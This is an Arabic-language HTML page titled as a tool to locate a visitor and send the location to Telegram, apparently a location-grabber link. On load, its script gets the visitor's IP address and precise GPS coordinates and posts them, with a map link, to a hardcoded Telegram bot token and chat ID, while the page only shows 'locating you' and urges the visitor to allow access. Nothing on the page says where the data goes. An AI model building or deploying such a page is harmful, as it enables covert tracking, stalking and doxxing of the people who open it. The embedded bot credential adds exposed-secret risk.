<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تحديد الموقع وإرساله لتليجرام</title>
</head>
<body>
  <h2 style="text-align:center;">جارٍ تحديد موقعك...</h2>
  <script>
    const BOT_TOKEN = "7838285515:AAFIhk3dSkC-q3vfjxVUbxgApUl1ze20II0"; // حط توكن البوت هنا
    const CHAT_ID = "7424074346"; // حط chat id هنا

    async function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: CHAT_ID,
        text,
        parse_mode: "Markdown"
      };
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        if (data.ok) {
          console.log("✅ الرسالة تم إرسالها بنجاح");
        } else {
          console.error("❌ خطأ في إرسال الرسالة:", data);
        }
      } catch (e) {
        console.error("❌ خطأ في fetch:", e);
      }
    }

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "غير معروف";
      }
    }

    function buildMessage(ip, lat, lon) {
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      return `
📍 موقع جديد تم رصده:

🌐 IP: ${ip}
📌 خط العرض: ${lat}
📍 خط الطول: ${lon}
🔗 [فتح الموقع في الخريطة](${mapsLink})
📡 المصدر: GPS ✅
      `;
    }

    async function init() {
      const ip = await getIP();

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude.toFixed(7);
            const lon = pos.coords.longitude.toFixed(7);
            const message = buildMessage(ip, lat, lon);
            await sendTelegramMessage(message);
          },
          (err) => {
            console.error("⚠️ رفضت أو فشل الحصول على الموقع:", err.message);
            alert("لم يتم الحصول على الموقع. رجاءً اقبل السماح للموقع.");
          },
          { timeout: 10000 }
        );
      } else {
        alert("المتصفح لا يدعم ميزة تحديد الموقع.");
      }
    }

    window.onload = init;
  </script>
</body>
</html>
